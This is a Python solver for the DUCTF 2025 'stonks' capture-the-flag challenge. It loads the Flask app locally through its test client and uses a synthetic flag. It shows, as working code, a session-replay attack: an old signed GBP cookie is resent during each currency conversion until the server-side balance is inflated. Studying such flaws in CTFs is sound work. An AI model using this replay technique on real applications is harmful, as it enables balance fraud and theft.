"""DUCTF 2025 stonks: replay an old Flask session during currency changes.

The original, trusted Flask challenge application is loaded locally and
exercised through Flask's test client. No remote target is contacted and the
fixture's FLAG environment variable is set to a *synthetic* marker.

The vulnerable app keeps the balance server-side but trusts a signed client
session cookie's 'currency'. Replaying a valid, older GBP cookie repeatedly
while converting GBP -> IDR multiplies the balance every time.
"""
import argparse
import importlib.util
import os
import re
import sys
from pathlib import Path

SYNTHETIC_FLAG = "DUCTF{LOCAL_STONKS_TEST_ONLY}"


def check_source(source: str) -> None:
    required = (
        r'user_balances\[u\]\s*=\s*\(user_balances\[u\]\s*/\s*'
        r'CURRENCY_CONVERSIONS\[old_currency\]\)\s*\*\s*'
        r'CURRENCY_CONVERSIONS\[new_currency\]',
        r'old_currency\s*=\s*session\["currency"\]',
        r'session\["currency"\]\s*=\s*new_currency',
        r'balance_aud\s*=\s*user_balances\.get\(u,\s*0\)\s*/'
        r'\s*CURRENCY_CONVERSIONS\[currency\]',
        r'if balance_aud > SUPER_RICH',
    )
    for pattern in required:
        if re.search(pattern, source) is None:
            raise ValueError("Original stonks conversion or check is missing")


def load_original_app(source_file: Path, template_folder: Path, marker: str):
    """Only load locally trusted challenge source. Never load arbitrary files."""
    if re.fullmatch(r"DUCTF\{[A-Z0-9_]+\}", marker) is None:
        raise ValueError("Synthetic flag marker format invalid")
    source = source_file.read_text(encoding="utf-8")
    check_source(source)
    if not template_folder.is_dir():
        raise ValueError("Missing original template folder")
    old_flag = os.environ.get("FLAG")
    try:
        os.environ["FLAG"] = marker
        name = "_ductf_stonks_local_fixture"
        spec = importlib.util.spec_from_file_location(name, source_file)
        if spec is None or spec.loader is None:
            raise ValueError("Unable to import original challenge fixture")
        module = importlib.util.module_from_spec(spec)
        sys.modules[name] = module
        spec.loader.exec_module(module)
    finally:
        if old_flag is None:
            os.environ.pop("FLAG", None)
        else:
            os.environ["FLAG"] = old_flag
    module.app.template_folder = str(template_folder.resolve())
    module.app.config.update(TESTING=True)
    return module


def replay_old_currency_session(source_file: Path, template_folder: Path,
                                marker: str = SYNTHETIC_FLAG,
                                attempts: int = 8) -> tuple[float, int, str]:
    """Return (AUD-equivalent balance, conversion count, flag-like marker).

    Conversion requests repeatedly start with the *same legitimate GBP
    session cookie*, not the most recent IDR cookie returned by the app.
    """
    if attempts < 1 or attempts > 100:
        raise ValueError("Conversion attempts must be between 1 and 100")
    module = load_original_app(source_file, template_folder, marker)
    with module.app.test_client() as client:
        user = "ctf_test"
        pw = "test-password"
        registered = client.post("/register", data={
            "username": user, "password": pw, "confirm_password": pw
        })
        if registered.status_code not in (302, 303):
            raise RuntimeError("Local account registration failed")
        logged_in = client.post("/login", data={
            "username": user, "password": pw,
        })
        if logged_in.status_code not in (302, 303):
            raise RuntimeError("Local account login failed")
        changed = client.post("/change-currency", data={"currency": "GBP"})
        if changed.status_code not in (302, 303):
            raise RuntimeError("Initial AUD -> GBP conversion failed")
        saved = client.get_cookie("session")
        if saved is None:
            raise RuntimeError("Flask did not issue a signed session cookie")
        old_cookie = saved.value
        threshold = module.SUPER_RICH
        for i in range(1, attempts + 1):
            # Reset only the client session, never the server-side balance.
            client.set_cookie("session", old_cookie)
            response = client.post("/change-currency", data={"currency": "IDR"})
            if response.status_code not in (302, 303):
                raise RuntimeError("Replay conversion request failed")
            amount = module.user_balances[user] / module.CURRENCY_CONVERSIONS["GBP"]
            if amount > threshold:
                client.set_cookie("session", old_cookie)
                result = client.get("/are-you-rich")
                html = result.get_data(as_text=True)
                if result.status_code != 200 or marker not in html:
                    raise RuntimeError("App did not display synthetic success flag")
                return amount, i, marker
        raise ValueError("Did not exceed the rich threshold within attempts")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("source", type=Path)
    parser.add_argument("template_directory", type=Path)
    args = parser.parse_args()
    balance, n, marker = replay_old_currency_session(
        args.source, args.template_directory)
    print(f"Currency replay exceeded threshold after {n} conversions")
    print(f"Local audited AUD balance: {balance:.2f}")
    print(f"Original Flask endpoint displayed synthetic marker: {marker}")
    print("No hosted challenge flag was obtained.")

if __name__ == "__main__":
    main()
